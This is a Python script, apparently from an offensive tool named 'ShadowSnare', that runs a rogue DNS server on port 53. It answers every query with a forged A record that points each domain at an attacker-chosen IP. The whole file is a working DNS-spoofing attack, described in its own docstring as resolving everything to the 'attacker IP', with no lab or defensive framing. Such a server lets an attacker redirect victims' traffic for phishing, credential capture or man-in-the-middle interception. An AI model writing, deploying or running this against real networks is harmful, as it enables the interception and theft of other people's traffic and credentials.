#!/usr/bin/env python3
"""
Simple DNS Server for ShadowSnare - Responds to ALL queries with attacker IP
This fixes the DNS spoofing issue by providing a real DNS server on port 53
"""

import socket
import threading
import struct
import time

class SimpleDNSServer:
    def __init__(self, host='0.0.0.0', port=53, spoof_ip='192.168.1.14'):
        self.host = host
        self.port = port
        self.spoof_ip = spoof_ip
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        
        print(f"🚀 DNS Server initializing...")
        print(f"📡 Listening on: {host}:{port}")
        print(f"🎯 Spoofing ALL domains to: {spoof_ip}")
        
    def create_dns_response(self, query_data):
        """Create DNS response that spoofs ALL domains to our IP"""
        try:
            # Parse DNS header
            transaction_id = query_data[:2]
            flags = b'\x81\x80'  # Standard query response, no error
            questions = b'\x00\x01'  # 1 question
            answers = b'\x00\x01'   # 1 answer
            authority = b'\x00\x00'  # 0 authority records
            additional = b'\x00\x00'  # 0 additional records
            
            # Extract question from query (skip header)
            question_start = 12
            question_end = query_data.find(b'\x00', question_start) + 5  # +5 for null, type, class
            question = query_data[question_start:question_end]
            
            # Create answer section
            name_pointer = b'\xc0\x0c'  # Pointer to domain name in question
            record_type = b'\x00\x01'   # A record
            record_class = b'\x00\x01'  # IN class
            ttl = b'\x00\x00\x00\x3c'   # TTL 60 seconds
            data_length = b'\x00\x04'   # 4 bytes for IPv4
            
            # Convert spoofed IP to bytes
            ip_parts = self.spoof_ip.split('.')
            ip_bytes = struct.pack('!BBBB', *[int(part) for part in ip_parts])
            
            # Assemble complete response
            response = (transaction_id + flags + questions + answers + authority + additional + 
                       question + name_pointer + record_type + record_class + ttl + data_length + ip_bytes)
            
            return response
            
        except Exception as e:
            print(f"❌ Error creating DNS response: {e}")
            return None
    
    def handle_query(self, data, addr):
        """Handle incoming DNS query"""
        try:
            # Extract domain name for logging
            domain = self.extract_domain(data)
            print(f"🔍 DNS Query from {addr[0]}: {domain} -> {self.spoof_ip}")
            
            # Create spoofed response
            response = self.create_dns_response(data)
            if response:
                self.socket.sendto(response, addr)
                print(f"✅ Spoofed response sent: {domain} -> {self.spoof_ip}")
            else:
                print(f"❌ Failed to create response for {domain}")
                
        except Exception as e:
            print(f"❌ Error handling query from {addr}: {e}")
    
    def extract_domain(self, data):
        """Extract domain name from DNS query for logging"""
        try:
            # Skip DNS header (12 bytes)
            pos = 12
            domain_parts = []
            
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                domain_parts.append(data[pos:pos+length].decode('utf-8'))
                pos += length
            
            return '.'.join(domain_parts) if domain_parts else 'unknown'
        except:
            return 'unknown'
    
    def start(self):
        """Start DNS server"""
        try:
            self.socket.bind((self.host, self.port))
            self.running = True
            print(f"✅ DNS Server started on {self.host}:{self.port}")
            print(f"🎯 ALL DNS queries will resolve to: {self.spoof_ip}")
            print(f"🔍 Press Ctrl+C to stop")
            
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(512)
                    # Handle each query in a separate thread for performance
                    thread = threading.Thread(target=self.handle_query, args=(data, addr))
                    thread.daemon = True
                    thread.start()
                except socket.error as e:
                    if self.running:
                        print(f"❌ Socket error: {e}")
                        
        except PermissionError:
            print("❌ Permission denied. Run with sudo: sudo python3 dns_server.py")
        except Exception as e:
            print(f"❌ Failed to start DNS server: {e}")
        finally:
            self.socket.close()
    
    def stop(self):
        """Stop DNS server"""
        self.running = False
        self.socket.close()
        print("🛑 DNS Server stopped")

if __name__ == "__main__":
    import sys
    
    # Get spoof IP from command line or use default
    spoof_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.14"
    
    print("🚀 ShadowSnare DNS Server")
    print("=" * 50)
    
    server = SimpleDNSServer(spoof_ip=spoof_ip)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n🛑 Stopping DNS server...")
        server.stop()
        print("✅ DNS server stopped successfully")
